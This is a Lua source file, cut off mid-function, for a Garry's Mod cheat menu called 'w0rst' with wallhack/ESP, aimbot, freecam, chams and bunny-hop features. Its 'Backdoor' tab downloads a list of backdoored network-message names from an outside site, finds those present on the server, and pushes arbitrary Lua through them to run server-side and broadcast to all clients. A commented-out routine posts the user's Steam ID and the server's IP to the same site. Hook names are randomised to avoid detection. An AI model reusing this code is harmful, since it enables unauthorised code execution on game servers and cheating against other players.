local wtf={}

function wtf.gString(l)
    local s = ""
    for i = 1, l do
    s = s.. string.char(math.random(32, 126))
end return s
end

local UseTimer, LogTimer = wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220))
local RelayHook, KeyHook = wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220))
local PhysgunHook, EspHook = wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220))
local BhopHook, FSHook = wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220))
local RainbowEnable, SkeletonEnable, RefreshHook = false, false, wtf.gString(math.random(10, 220))
local EntList, Ent3DEnable, EntNameEnable, EntDistanceEnable = {}, false, false, false
local TracerEnable, DistanceEnable, NameEnable, WeaponEnable = false, false, false, false
local WallhackEnable, FreecamEnable, BhopEnable, IsKeyDown = false, false, false, false
local Box3DEnable, UseSpamEnable, Box2DEnable = false, false, false
local FlashSpamEnable, ChamsEnable = false, false
local SelectedNet, SelectedPlr = "NONE", "NONE"

local AimbotEnable, AimbotHook = false, wtf.gString(math.random(10, 220))
local FovPos, FovCircle = { x = 960, y = 540 }, { 80 }
local FovColor = { r=255, g=255, b=255 }

local LogPosY = 10
local BDServerPosY, BDClientPosY = 5, 5
local SoundPosX, SoundPosY = 17, 10
local PlrPosX, PlrPosY, plr = 19, 10, nil

local TracerColor = { r=255, g=255, b=255 }
local DistanceColor = { r=255, g=255, b=255 }
local NameColor = { r=255, g=255, b=255 }
local WeaponColor = { r=255, g=255, b=255 }
local Box2DColor = { r=255, g=255, b=255 }
local Box3DColor = { r=255, g=255, b=255 }
local SkeletonColor ={ r=255, g=255, b=255 }
local ChamsColor = { r=255, g=255, b=255 }
local EntityColor = { r=255, g=255, b=255 }

-- function Relay()
--     local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
--     local lp = LocalPlayer()
--     http.Post("https://w0rst.xyz/api/relay.php", {
--         username=UserInfo[1],
--         steam_name=lp:Name(),
--         steam_id=lp:SteamID(),
--         server_name=GetHostName(),
--         server_ip=game.GetIPAddress() }, function(b)
--         local s = string.Split(b, " ");
--         if(s[1] == "a4dF91aE25c2BFD11F879e42") then
--             function die() return die() end die()
--         end
--     end)
-- end
--
-- local RelayDelay = 0
-- hook.Add("Think", RelayHook, function()
--     if CurTime() < RelayDelay then return end
--     RelayDelay = CurTime() + 60
--     Relay()
-- end)

function wtf.CheckNet(str)
    return (_G.util.NetworkStringToID(str) > 0)
end

function wtf.CheckPlr()
    if (plr ~= nil && Player(plr):IsValid() ~= false) then
        SelectedPlr = plr
        return true
    else
        wtf.Log("Player Not Selected/Valid")
        wtf.conoutRGB("PLAYER INVALID OR NOT SELECTED")
    end
end

function wtf.CheckWebNets()
    http.Post("https://w0rst.xyz/api/net/view.php", { A0791AfFA0F30EdCee1EdADb="02C2C6A1Ded7183AeDAA8650" }, function(b)
        local Nets = string.Split(b, " ")
        for k,v in pairs(Nets) do
            if wtf.CheckNet(v) then
                wtf.Log("Net Found: "..v)
                wtf.conoutRGB("NET: "..v)
                SelectedNet=v
            end
        end
    end)
end

function wtf.AddNet(str)
    local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
    http.Post("https://w0rst.xyz/api/net/upload.php", { username=UserInfo[1], net=str }, function(b)
          if b[1] == "0" then wtf.Log("Incorrect Permissions")
          else wtf.Log("Uploaded Net "..str) end
    end)
end

function wtf.SendLua(lua, s_c, name)
    if wtf.CheckNet(SelectedNet) then
        _G.net.Start(SelectedNet)
        _G.net.WriteString(lua)
        _G.net.WriteBit(1)
        _G.net.SendToServer()
    else
        wtf.Log("Net Not Selected"); wtf.conoutRGB("Error: Net Not Selected")
    end
end

wtf.Icons = { V="https://w0rst.xyz/script/images/visuals.png", P="https://w0rst.xyz/script/images/players.png", B="https://w0rst.xyz/script/images/backdoor.png", M="https://w0rst.xyz/script/images/misc.png", S="https://w0rst.xyz/script/images/sounds.png" }

function wtf.Download(filename, url, callback, errorCallback)
    local path = "w0rst/images/" .. filename
    local dPath = "data/" .. path
    if (file.Exists(path, "DATA")) then return callback(dPath) end
    if (not file.IsDir(string.GetPathFromFilename(path), "DATA")) then
        file.CreateDir(string.GetPathFromFilename(path))
    end

    errorCallback = errorCallback or function(reason) end
    http.Fetch(url, function(body, size, headers, code)
    if (code ~= 200) then return errorCallback(code) end
        file.Write(path, body)
        callback(dPath)
    end, errorCallback)
end

function wtf.IconSet(iconUrls, path, cb)
    local set = {}
    local count = 0
    local iconAmt = table.Count(iconUrls)

    for name, url in pairs(iconUrls) do
        wtf.Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
            set[name] = Material(path, "unlitgeneric")
            count = count + 1
        if (count == iconAmt and cb) then
            cb(set)
        end
    end)
end return set
end

function wtf.Map(tbl, fn)
	local new = {}
	for k, v in pairs(tbl) do
		new[k] = fn(v, k, tbl)
    end return new
end

wtf.Materials = {}
wtf.Materials = wtf.IconSet(wtf.Icons, "")

wtf.IconSet(wtf.Map(wtf.Icons, function(v) return end), "",
function(icons)
    for k, icon in pairs(icons) do
        wtf.Icons[k].iconMat = icon
    end
end)

surface.CreateFont('Font', {
    font = 'Open Sans',
    extended = false,
    size = 20,
    weight = 1000,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = true,
    additive = false,
    outline = false,
})

surface.CreateFont('Sounds', {
    font = 'Marlett',
    extended = false,
    size = 17,
    weight = 1000,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = true,
    additive = true,
    outline = true,
})

function wtf.conoutRGB(str)
	local text = {}
	for i = 1, #str do
		table.insert(text, HSVToColor(i * math.random(2, 10) % 360, 1, 1 ))
		table.insert(text, string.sub(str, i, i))
	end

	table.insert(text, "\n")
	MsgC(unpack(text))
end

function wtf.Log(str)
    local Frame=vgui.Create("DFrame")
    Frame:SetSize(220,30)
    Frame:SetPos(-300, LogPosY)
    Frame:SetTitle("~w0rst~ "..str)
    Frame:ShowCloseButton(false)
    Frame:SetDraggable(false)
    Frame.Paint = function(s,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
        surface.SetDrawColor(Color(15,15,15, 255))
        surface.DrawOutlinedRect(0,0,s:GetWide(),s:GetTall())
    end

    Frame:MoveTo(5, LogPosY, 1,0,0.5)
    timer.Simple(3, function()
        local x, y = Frame:GetPos()
        Frame:MoveTo(-300, y, 1, 0, 0.5);
        timer.Simple(0.5, function() Frame:Close() end)
    end)

    LogPosY=LogPosY+35
    timer.Remove(LogTimer)
    timer.Create(LogTimer, 3.5, 1, function()
        LogPosY=10
    end)
end

-- 600 + 50
-- 540 + 80

local Menu=vgui.Create("DFrame")
Menu:SetSize(650,620)
Menu:SetTitle("")
Menu:Center()
Menu:MakePopup()
Menu:SetPaintShadow(true)
Menu:ShowCloseButton(false)
Menu:SetDraggable(true)
Menu.Paint = function(self,w,h)
    local rainbow = HSVToColor((CurTime() * 99) % 360, 1, 1)
    draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
    surface.SetDrawColor(rainbow.r,rainbow.g,rainbow.b,255)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local MenuCloseButton=vgui.Create("DButton", Menu)
MenuCloseButton:SetText("X")
MenuCloseButton:SetSize(30,30)
MenuCloseButton:SetPos(620,0)
MenuCloseButton.DoClick = function() Menu:Hide() end
MenuCloseButton.Paint = function(self,w,h)
    self:SetTextColor(Color(75,75,75, 105))
    surface.SetDrawColor(Color(0,0,0,0))
    surface.DrawOutlinedRect(0,0,w,h)
end

local Tab=vgui.Create("DFrame", Menu)
Tab:ShowCloseButton(false)
Tab:SetDraggable(false)
Tab:SetTitle("")
Tab:SetSize(620,580)
Tab:SetPos(15, 30)
Tab.Paint = function(self, w, h)
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
end

local Background=vgui.Create("HTML", Tab)
Background:SetVisible(true)
Background:SetPos(150, 90)
Background:SetSize(490,390)
Background:SetHTML([[<img src='https://i.imgur.com/OMKLFDr.png' alt='Img' style='width:300px;height:300px;'>]])

local TabVisuals=vgui.Create("DFrame", Tab)
TabVisuals:ShowCloseButton(false)
TabVisuals:SetVisible(false)
TabVisuals:SetDraggable(false)
TabVisuals:SetTitle("")
TabVisuals:SetSize(515, 560)
TabVisuals:SetPos(95, 10)
TabVisuals.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local TabPlayers=vgui.Create("DFrame", Tab)
TabPlayers:ShowCloseButton(false)
TabPlayers:SetVisible(false)
TabPlayers:SetDraggable(false)
TabPlayers:SetTitle("")
TabPlayers:SetSize(515, 560)
TabPlayers:SetPos(95, 10)
TabPlayers.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local TabBackdoor=vgui.Create("DFrame", Tab)
TabBackdoor:ShowCloseButton(false)
TabBackdoor:SetVisible(false)
TabBackdoor:SetDraggable(false)
TabBackdoor:SetTitle("")
TabBackdoor:SetSize(515, 560)
TabBackdoor:SetPos(95, 10)
TabBackdoor.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    draw.SimpleText("Client", "Font", 355, 7, Color(255,255,255,255))
    draw.SimpleText("Server", "Font", 105, 7, Color(255,255,255,255))
end

local TabSounds=vgui.Create("DFrame", Tab)
TabSounds:ShowCloseButton(false)
TabSounds:SetVisible(false)
TabSounds:SetDraggable(false)
TabSounds:SetTitle("")
TabSounds:SetSize(515, 560)
TabSounds:SetPos(95, 10)
TabSounds.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local TabMisc=vgui.Create("DFrame", Tab)
TabMisc:ShowCloseButton(false)
TabMisc:SetVisible(false)
TabMisc:SetDraggable(false)
TabMisc:SetTitle("")
TabMisc:SetSize(515, 560)
TabMisc:SetPos(95, 10)
TabMisc.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local LuaEditor=vgui.Create("DTextEntry", TabBackdoor)
LuaEditor:SetPos(10, 325)
LuaEditor:AllowInput()
LuaEditor:SetSize(495, 185)
LuaEditor:SetValue("Run Lua | Server-Side")
LuaEditor:SetMultiline(true)
LuaEditor.Paint = function(self, w, h)
    surface.SetDrawColor(15, 15, 15, 255)
    surface.DrawOutlinedRect(0, 0, w, h)
    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    self:SetFont('Trebuchet18')
end

local function CreateTabButton(show, mat, x, y)
    Button=vgui.Create("DButton", Tab)
    Button:SetSize(70,70)
    Button:SetPos(x, y)
    Button:SetText("")
    Button:SetMaterial(mat)
    Button.Paint = function(self, w, h) surface.SetDrawColor(Color(0,0,0)) end
    Button.DoClick = function()
        if(show == TabVisuals) then
            show:SetVisible(true); Background:SetVisible(false)
            TabPlayers:SetVisible(false); TabBackdoor:SetVisible(false);
            TabSounds:SetVisible(false); TabMisc:SetVisible(false);
        end
        if(show == TabPlayers) then
            show:SetVisible(true); Background:SetVisible(false)
            TabVisuals:SetVisible(false); TabBackdoor:SetVisible(false);
            TabSounds:SetVisible(false); TabMisc:SetVisible(false);
        end
        if(show == TabBackdoor) then
            show:SetVisible(true); Background:SetVisible(false)
            TabPlayers:SetVisible(false); TabVisuals:SetVisible(false);
            TabSounds:SetVisible(false); TabMisc:SetVisible(false);
        end
        if(show == TabSounds) then
            show:SetVisible(true); Background:SetVisible(false)
            TabPlayers:SetVisible(false); TabBackdoor:SetVisible(false);
            TabVisuals:SetVisible(false); TabMisc:SetVisible(false);
        end
        if(show == TabMisc) then
            show:SetVisible(true); Background:SetVisible(false)
            TabPlayers:SetVisible(false); TabBackdoor:SetVisible(false);
            TabSounds:SetVisible(false); TabVisuals:SetVisible(false);
        end
    end return { Button }
end

local function CreatePanel(tab, width, height, x, y)
    local Pannel=vgui.Create("DScrollPanel", tab)
    Pannel:SetSize(width,height)
    Pannel:SetPos(x, y)
    Pannel:GetVBar():SetWide(0)
    Pannel.Paint = function(self,w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end
    return { Pannel }
end

local function CreateButton(name, tab, width, height, x, y, func)
    Button=vgui.Create("DButton", tab)
    Button:SetSize(width, height)
    Button:SetPos(x, y)
    Button:SetText(name)
    Button.DoClick = func
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end
end

--/ init panels for later functions
local PlayerPanel=CreatePanel(TabPlayers, 495, 540, 10, 10)
local EntityPanel=CreatePanel(TabVisuals, 490, 350, 15, 190)
local SoundPanel=CreatePanel(TabSounds, 495, 505, 10, 10)
local ServerBDPanel=CreatePanel(TabBackdoor, 225, 280, 20, 35)
local ClientBDPanel=CreatePanel(TabBackdoor, 225, 280, 270, 35)

local function CreateBDServer(name, func)
    Button=vgui.Create("DButton", ServerBDPanel[1])
    Button:SetSize(195, 30)
    Button:SetPos(15, BDServerPosY)
    Button:SetText(name)
    Button.DoClick = function()
        if SelectedNet ~= "NONE" then
            func()
        else
            wtf.Log("No Net Selected")
        end
    end
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    BDServerPosY = BDServerPosY + 35
end

local function CreateBDClient(name, func)
    Button=vgui.Create("DButton", ClientBDPanel[1])
    Button:SetSize(195, 30)
    Button:SetPos(12, BDClientPosY)
    Button:SetText(name)
    Button.DoClick = function()
        if wtf.CheckNet(SelectedNet) then
            func()
        else
            wtf.Log("No Net Selected")
        end
    end
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    BDClientPosY = BDClientPosY + 35
end

local Sounds = {
    "Velvet https://w0rst.xyz/script/sounds/egovert-velvet.mp3",
    "MrMoney https://w0rst.xyz/script/sounds/shotgunwilly-mrmoney.mp3",
    "GoLoko https://w0rst.xyz/script/sounds/tyga-goloko.mp3",
    "BadBoy https://w0rst.xyz/script/sounds/yungbae-badboy.mp3",
    "RooDoo https://w0rst.xyz/script/sounds/bbno$-roodoo.mp3",
    "SingleSummer https://w0rst.xyz/script/sounds/gyyps-singleforthesummer.mp3",
    "Quiting https://w0rst.xyz/script/sounds/khary-quitting.mp3",
    "DoubtIt https://w0rst.xyz/script/sounds/kyle-doubtit.mp3",
    "Hex https://w0rst.xyz/script/sounds/80purp-hex.mp3",
    "DownBad https://w0rst.xyz/script/sounds/jcole-downbad.mp3",
    "JustTheTwoOfUs https://w0rst.xyz/script/sounds/groverwashington-justthetwoofus.mp3",
    "StillCreeping https://w0rst.xyz/script/sounds/chuuwee-still-creeping.mp3",
    "BeLazy https://w0rst.xyz/script/sounds/skizzymars-be-lazy.mp3"
}

local function CreateSoundButtons()
    local Loop = table.Count(Sounds)
    for i = 1, Loop do
        local Song = string.Split(Sounds[i], " ") --/ split the name & url
        local Button = vgui.Create("DButton", SoundPanel[1])
        Button:SetSize(145,100)
        Button:SetText(Song[1])
        Button:SetFont("Sounds")
        Button:SetPos(SoundPosX, SoundPosY)
        Button.Paint = function(self, w,h)
            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
            surface.SetDrawColor(40, 40, 40, 255)
            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
            self:SetTextColor(Color(155,155,155))
        end
        Button.DoClick = function()
            if wtf.CheckNet(SelectedNet) then
                wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..Song[2]..[[','mono',function(station) station:Play() end)")]])
                wtf.Log("Sent Sound: "..Song[1]); wtf.conoutRGB("PLAYED SOUND: "..Song[1])
            else
                wtf.Log("No Net Selected"); wtf.conoutRGB("NO NET SELECTED")
            end
        end
        -- 17
        SoundPosX=SoundPosX+158
        if SoundPosX==491 then
            SoundPosX=17
            SoundPosY=SoundPosY+110
        end
    end
end

local function CreateCheckbox(name, tab, x, y, func)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(110,25)
    Frame:SetPos(x,y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetTitle("")
    Frame.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end

    local Checkbox = Frame:Add("DCheckBoxLabel")
    Checkbox:SetPos(5,5)
    Checkbox:SetText(name)
    Checkbox:SetDark(true)
    Checkbox.OnChange = func
    Checkbox.Paint = function(self, w, h)
        self:SetTextColor(Color(255,255,255))
    end
end

local function CreateSlider(name, tab, table, x, y)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(120,25)
    Frame:SetPos(x, y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetVisible(true)
    Frame:SetTitle(" ")
    Frame.Paint = function(self, w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end

    local Slider=vgui.Create("DNumSlider", Frame)
    Slider:SetText(name);
    Slider:SetMin(1);
    Slider:SetMax(1200)
    Slider:SetSize(125, 10)
    Slider:SetPos(5, 5)
    Slider:SetDecimals(0)
    Slider:SetDark(true)
    Slider.OnValueChanged = function(self, value)
        table[1]=self:GetValue()
    end

    return { Frame, Slider }
end

local function CreateColorSlider(name, tab, color, x, y)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(120,85)
    Frame:SetPos(x,y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetTitle(name)
    Frame.Paint = function(self, w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end

    local ColorR=vgui.Create("DNumSlider", Frame)
    ColorR:SetText("Red:");
    ColorR:SetMin(0);
    ColorR:SetMax(255)
    ColorR:SetSize(125, 10)
    ColorR:SetPos(10,25)
    ColorR:SetDecimals(0)
    ColorR:SetDark(true)
    ColorR.OnValueChanged = function(self, value)
        color.r=self:GetValue()
    end

    local ColorG=vgui.Create("DNumSlider", Frame)
    ColorG:SetText("Green:")
    ColorG:SetMin(0);
    ColorG:SetMax(255)
    ColorG:SetSize(125, 10)
    ColorG:SetPos(10,45)
    ColorG:SetDecimals(0)
    ColorG:SetDark(true)
    ColorG.OnValueChanged = function(self, value)
        color.g=self:GetValue()
    end

    local ColorB=vgui.Create("DNumSlider", Frame)
    ColorB:SetText("Blue:");
    ColorB:SetMin(0);
    ColorB:SetMax(255)
    ColorB:SetSize(125, 10)
    ColorB:SetPos(10,65)
    ColorB:SetDecimals(0)
    ColorB:SetDark(true)
    ColorB.OnValueChanged = function(self, value)
        color.b=self:GetValue()
    end

    local function UpdateColorValues()
        if(ColorR:GetValue() ~= color.r) then ColorR:SetValue(color.r) end
        if(ColorG:GetValue() ~= color.g) then ColorG:SetValue(color.g) end
        if(ColorB:GetValue() ~= color.b) then ColorB:SetValue(color.b) end
    end; UpdateColorValues()

    return { ColorR, ColorG, ColorB }
end

local function PopulatePlayers()
    for k,v in pairs(player.GetAll()) do
      local Frame = vgui.Create("DFrame", PlayerPanel[1])
      Frame:SetPos(PlrPosX, PlrPosY)
      Frame:SetSize(145, 140)
      Frame:SetTitle(" ")
      Frame:SetDraggable(false)
      Frame:ShowCloseButton(false)
      Frame.Paint = function(self, w, h)
          surface.SetDrawColor(Color(15,15,15,255))
          surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
          draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
      end

      local LabelButton = vgui.Create("DButton", Frame)
      LabelButton:SetText("Select " .. v:Nick())
      LabelButton:SetColor(Color(255,255,255))
      LabelButton:SetSize(115, 30)
      LabelButton:SetPos(10, 100)
      LabelButton.Paint = function(self, w, h)
          draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
          surface.SetDrawColor(40, 40, 40, 255)
          surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
          self:SetTextColor(Color(255,255,255))
      end
      LabelButton.DoClick = function()
          plr = v:UserID()
          if wtf.CheckPlr() then
              wtf.Log("Player: "..Player(plr):Nick().." Selected")
              wtf.conoutRGB("SELECTED PLAYER: "..Player(plr):Nick())
          end
      end

      local AvatarFrame = vgui.Create("DFrame", Frame)
      AvatarFrame:SetSize(82, 82)
      AvatarFrame:SetPos(32, 10)
      AvatarFrame:SetTitle(" ")
      AvatarFrame:SetDraggable(false)
      AvatarFrame:ShowCloseButton(false)
      AvatarFrame.Paint = function(self, w, h)
          draw.RoundedBox(0,0,0,w,h,Color(0,0,0, 255))
      end

      local Avatar = vgui.Create( "AvatarImage", AvatarFrame)
      Avatar:SetSize(80, 80)
      Avatar:Center()
      Avatar:SetPlayer(v, 128)
      Avatar.Paint = function(self, w, h)
          draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255))
      end

      PlrPosX=PlrPosX+155
      if PlrPosX==484 then
          PlrPosX=19
          PlrPosY=PlrPosY+150
      end
    end
end

PopulatePlayers()

local RefreshDelay = 5
hook.Add("Think", RefreshHook, function()
    if CurTime() < RefreshDelay then return end
    RefreshDelay = CurTime() + 5
    PlayerPanel[1]:GetCanvas():Clear()
    PlrPosX, PlrPosY = 19, 10
    PopulatePlayers()
end)

local EntOnList = vgui.Create("DListView", EntityPanel[1])
EntOnList:SetPos( 220, 0)
EntOnList:SetSize( 220, 349 )
EntOnList:SetMultiSelect(false)
EntOnList:AddColumn("Whitelisted Entities")
EntOnList:SetHideHeaders(true)
EntOnList.Paint = function(self,w,h)
    surface.SetDrawColor(Color(0,0,0,0))
    surface.DrawOutlinedRect(0,0,w,h)
end

local EntOffList = vgui.Create("DListView", EntityPanel[1])
EntOffList:SetPos( 0, 0 )
EntOffList:SetSize( 220, 348 )
EntOffList:SetMultiSelect(false)
EntOffList:SetHideHeaders(true)
EntOffList:AddColumn("Whitelist Entities")
EntOffList.Paint = function(self,w,h)
  surface.SetDrawColor(Color(0,0,0,0))
  surface.DrawOutlinedRect(0,0,w,h)
end
function EntOffList:DoDoubleClick()
    table.insert( EntList, EntOffList:GetLine(EntOffList:GetSelectedLine()):GetValue(1) )
end

function RefreshEntList()
    EntOnList:Clear(); EntOffList:Clear()
    for k, v in pairs(EntList) do
        EntOnList:AddLine(v)
    end

    for k, v in pairs(ents.GetAll()) do
        local name = v:GetClass()
        local copy = false
        if name ~= "player" then
            if not table.HasValue( EntList, name ) then
                for k, v in pairs (EntOffList:GetLines() ) do
                    if v:GetValue(1) == name then copy = true end
                end
                if copy == false then EntOffList:AddLine(name) end
            end
        end
    end
end; RefreshEntList()

local TabButtonVisuals=CreateTabButton(TabVisuals, wtf.Materials.V, 13, 5)
local TabButtonMisc=CreateTabButton(TabMisc, wtf.Materials.M, 13, 85)
local TabButtonPlayers=CreateTabButton(TabPlayers, wtf.Materials.P, 13, 165)
local TabButtonBackdoor=CreateTabButton(TabBackdoor, wtf.Materials.B, 13, 245)
local TabButtonSounds=CreateTabButton(TabSounds, wtf.Materials.S, 13, 325)

timer.Simple(7.5, function()
    TabButtonVisuals[1]:SetMaterial(wtf.Materials.V)
    TabButtonPlayers[1]:SetMaterial(wtf.Materials.P)
    TabButtonBackdoor[1]:SetMaterial(wtf.Materials.B)
    TabButtonSounds[1]:SetMaterial(wtf.Materials.S)
    TabButtonMisc[1]:SetMaterial(wtf.Materials.M)
end)

local TracerSlider = CreateColorSlider("Tracer-Editor", TabMisc, TracerColor, 9, 280)
local DistanceSlider = CreateColorSlider("Distance-Editor", TabMisc, DistanceColor, 134, 280)
local NameSlider = CreateColorSlider("Name-Editor", TabMisc, NameColor, 259, 280)
local WeaponSlider = CreateColorSlider("Weapon-Editor", TabMisc, WeaponColor, 384, 280)
local Box2DSlider = CreateColorSlider("Box-2D-Editor", TabMisc,  Box2DColor, 9, 370)
local Box3DSlider = CreateColorSlider("Box-3D-Editor", TabMisc, Box3DColor, 134, 370)
local SkeletonSlider = CreateColorSlider("Skeleton-Editor", TabMisc, SkeletonColor, 259, 370)
local ChamsSlider = CreateColorSlider("Chams-Editor", TabMisc, ChamsColor, 384, 370)
local EntitySlider = CreateColorSlider("Entity-Editor", TabMisc, EntityColor, 9, 460)
local FovSlider = CreateColorSlider("Fov-Editor", TabMisc, FovColor, 134, 460)

local FC={}
FC.Enabled=false
FC.Hook=wtf.gString(math.random(10, 220))
FC.FC_Speed=0.9
FC.ViewOrigin=Vector(0,0,0)
FC.ViewAngle=Angle(0,0,0)
FC.Velocity=Vector(0,0,0)
function FC.CalcView(ply, origin, angles, fov)
    if not FC.Enabled then return end
    if (FC.SetView) then
        FC.ViewOrigin=origin
        FC.ViewAngle=angles
        FC.SetView=false
    end
    return {origin=FC.ViewOrigin,angles=FC.ViewAngle}
end

hook.Add("CalcView", FC.Hook, FC.CalcView)
function FC.CreateMove(cmd)
    if not FC.Enabled then return end
    local time = FrameTime()
    FC.ViewOrigin = FC.ViewOrigin + ( FC.Velocity * time )
    FC.Velocity = FC.Velocity * FC.FC_Speed
    local sensitivity = 0.022
    FC.ViewAngle.p = math.Clamp( FC.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
    FC.ViewAngle.y = FC.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
    local add = Vector(0, 0, 0)
    local ang = FC.ViewAngle
    if(cmd:KeyDown(IN_FORWARD)) then add = add + ang:Forward() end
    if(cmd:KeyDown(IN_BACK)) then add = add - ang:Forward() end
    if(cmd:KeyDown(IN_MOVERIGHT)) then add = add + ang:Right() end
    if(cmd:KeyDown(IN_MOVELEFT)) then add = add - ang:Right() end
    if(cmd:KeyDown(IN_JUMP)) then add = add + ang:Up() end
    if(cmd:KeyDown(IN_DUCK)) then add = add - ang:Up() end
    add = add:GetNormal() * time * 500
    if (cmd:KeyDown(IN_SPEED)) then add = add * 5 end
    FC.Velocity = FC.Velocity + add
    if (FC.LockView == true) then FC.LockView = cmd:GetViewAngles() end
    if (FC.LockView) then cmd:SetViewAngles(FC.LockView) end
    cmd:SetForwardMove(0)
    cmd:SetSideMove(0)
    cmd:SetUpMove(0)
end

hook.Add("CreateMove", FC.Hook, FC.CreateMove)

local chams01 = CreateMaterial("a", "VertexLitGeneric", {
  ["$ignorez"] = 1,
  ["$model"] = 1,
  ["$basetexture"] = "models/debug/debugwhite",
})

local chams02 = CreateMaterial("@", "VertexLitGeneric", {
  ["$ignorez"] = 0,
  ["$model"] = 1,
  ["$basetexture"] = "models/debug/debugwhite",
})

wtf.Bones = {
    "ValveBiped.Bip01_Head1", "ValveBiped.Bip01_Neck1",
    "ValveBiped.Bip01_Spine4", "ValveBiped.Bip01_Spine2",
    "ValveBiped.Bip01_Spine1", "ValveBiped.Bip01_Spine",
    "ValveBiped.Bip01_Pelvis", "ValveBiped.Bip01_R_UpperArm",
    "ValveBiped.Bip01_R_Forearm", "ValveBiped.Bip01_R_Hand",
    "ValveBiped.Bip01_L_UpperArm", "ValveBiped.Bip01_L_Forearm",
    "ValveBiped.Bip01_L_Hand", "ValveBiped.Bip01_R_Thigh",
    "ValveBiped.Bip01_R_Calf", "ValveBiped.Bip01_R_Foot",
    "ValveBiped.Bip01_R_Toe0", "ValveBiped.Bip01_L_Thigh",
    "ValveBiped.Bip01_L_Calf", "ValveBiped.Bip01_L_Foot",
    "ValveBiped.Bip01_L_Toe0"
}

hook.Add("HUDPaint", EspHook, function()
    for k, v in pairs(ents.GetAll()) do
        if v:IsValid() and v ~= LocalPlayer() and not v:IsDormant() then
            local ent=v
            if Ent3DEnable or EntNameEnable or entitDistanceEnable then
                for k, v in pairs(EntList) do
                if v == ent:GetClass() and ent:GetOwner() ~= LocalPlayer() then
                    if EntNameEnable then
                        local name = ent:GetClass()
                        local position = (ent:GetPos() + Vector(0,0,5)):ToScreen()
